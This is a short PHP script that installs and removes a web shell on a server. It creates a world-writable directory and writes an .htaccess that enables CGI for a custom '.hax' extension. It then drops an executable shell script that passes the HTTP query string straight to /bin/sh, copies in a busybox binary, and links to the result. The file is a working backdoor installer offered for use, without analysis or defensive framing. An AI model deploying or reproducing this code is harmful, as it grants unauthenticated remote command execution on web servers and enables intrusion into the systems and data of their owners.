<a href="?create=1">Create</a> / <a href="?remove=1">Remove</a> shell files
<pre>
<?php

$dir = 'shell';
$htaccess = '.htaccess';
$shell = 'shell.hax';
$busybox = 'busybox';

function create_directory($folder) {
    echo "Creating directory... ";
    mkdir($folder, 0777) or die('failed<br />');
    echo "done<br />";
}

function create_htaccess($file) {
    echo "Creating htaccess... ";
    $handle = fopen($file, 'w') or die('failed<br />');
    $data = "Options +ExecCGI +Indexes\nAddHandler cgi-script .hax";
    fwrite($handle, $data);
    fclose($handle);
    echo "done<br />";
}

function create_shell($file) {
    echo "Creating shell... ";
    $handle = fopen($file, 'w') or die('failed<br />');
    $data = "#!/bin/sh\necho \"Content-type: text/html\"\necho \"\"\n/bin/sh -c \"\$QUERY_STRING 2>&1\"";
    fwrite($handle, $data);
    fclose($handle);
    echo "done<br />";
    echo "Making shell executable... ";
    chmod($file, 0755) or die('failed<br />');
    echo "done<br />";
}

function create_busybox($busybox, $busyboxbin) {
    echo "Creating busybox binary... ";
    copy($busybox, $busyboxbin) or die('failed to copy file<br />');
    chmod($busyboxbin, 0755) or die('failed to set permissions<br />');
    echo "done<br />";
}

$htaccess = $dir . '/' . $htaccess;
$shell = $dir . '/' . $shell;
$busyboxbin = $dir . '/' . $busybox . '.bin';

if ($_REQUEST['remove']) {
    if (file_exists($htaccess)) {
        echo "Deleting htaccess... ";
        unlink($htaccess);
        echo "done<br />";
    }
    if (file_exists($shell)) {
        echo "Deleting shell... ";
        unlink($shell);
        echo "done<br />";
    }
    if (file_exists($busyboxbin)) {
        echo "Deleting busybox binary... ";
        unlink($busyboxbin);
        echo "done<br />";
    }
    if (is_dir($dir)) {
        echo "Deleting folder... ";
        rmdir($dir);
        echo "done<br />";
    }
    echo "Removal complete<br />";
    exit;
}

if ($_REQUEST['create']) {
    create_directory($dir);
    create_htaccess($htaccess);
    create_shell($shell);
    create_busybox($busybox, $busyboxbin);
}

if (file_exists($shell)) {
    echo "<br />[<a href=\"$shell\">$shell</a>]<br />";
}
?>
</pre>

